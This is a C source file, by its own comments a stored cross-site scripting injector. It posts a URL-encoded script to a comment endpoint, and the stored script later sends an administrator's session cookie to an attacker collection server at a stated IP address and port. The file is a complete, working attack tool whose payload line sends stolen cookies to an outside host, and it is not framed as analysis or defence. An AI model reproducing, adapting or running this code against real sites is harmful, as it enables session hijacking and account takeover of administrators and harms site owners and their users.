/*
 * inject_stored.c
 *
 * Stored-XSS injector. Sends a single POST request to the target web
 * application that persists a malicious comment into its database. When an
 * administrator later views the comments, the stored payload runs in their
 * browser and sends their session cookie to the attacker collection server
 * (see cookie_logger.c).
 *
 * The HTTP response is drained and discarded.
 */

#include "config.h"
#include "sockio.h"

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

/* Target page whose handler stores the submitted comment. */
#define TARGET_PATH "/post_comment.php"

/*
 * URL-encoded stored payload. Decoded, it is:
 *   <script>fetch('http://192.168.1.201:5555/?cookieId1234='+document.cookie)</script>
 * i.e. on render it fetches the attacker server with the viewer's cookie
 * appended to the COOKIE_PARAM query parameter.
 */
#define PAYLOAD \
    "%3Cscript%3Efetch%28%27http%3A%2F%2F192.168.1.201%3A5555%2F%3F" \
    "cookieId1234%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E"

#define REQUEST_BUFFER 4096
#define BODY_BUFFER    2048

/* Read and discard the HTTP response until close/timeout, with a size cap. */
static int drain_response(int fd)
{
    const size_t cap_bytes = 10U * 1024U * 1024U; /* 10 MiB safety cap */
    size_t total = 0;
    char tmp[8192];

    for (;;) {
        ssize_t n = recv(fd, tmp, sizeof(tmp), 0);
        if (n == 0) {
            return 0; /* server closed */
        }
        if (n < 0) {
            if (errno == EINTR) {
                continue;
            }
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                return 0; /* timeout */
            }
            return -1;
        }
        total += (size_t)n;
        if (total > cap_bytes) {
            return 0;
        }
    }
}

int main(void)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        return 1;
    }
    set_socket_timeouts(fd, SOCKET_TIMEOUT_SECONDS);

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(TARGET_WEB_PORT);
    if (inet_pton(AF_INET, TARGET_WEB_IP, &serv_addr.sin_addr) <= 0) {
        close(fd);
        return 1;
    }

    if (connect(fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        close(fd);
        return 1;
    }

    char body[BODY_BUFFER];
    int body_len = snprintf(body, sizeof(body), "comment=%s", PAYLOAD);
    if (body_len < 0 || (size_t)body_len >= sizeof(body)) {
        close(fd);
        return 1;
    }

    char request[REQUEST_BUFFER];
    int req_len = snprintf(request, sizeof(request),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        TARGET_PATH, TARGET_WEB_IP, (size_t)body_len, body);
    if (req_len < 0 || (size_t)req_len >= sizeof(request)) {
        close(fd);
        return 1;
    }

    if (send_all(fd, request, (size_t)req_len) != 0) {
        close(fd);
        return 1;
    }

    (void)drain_response(fd);
    close(fd);
    return 0;
}
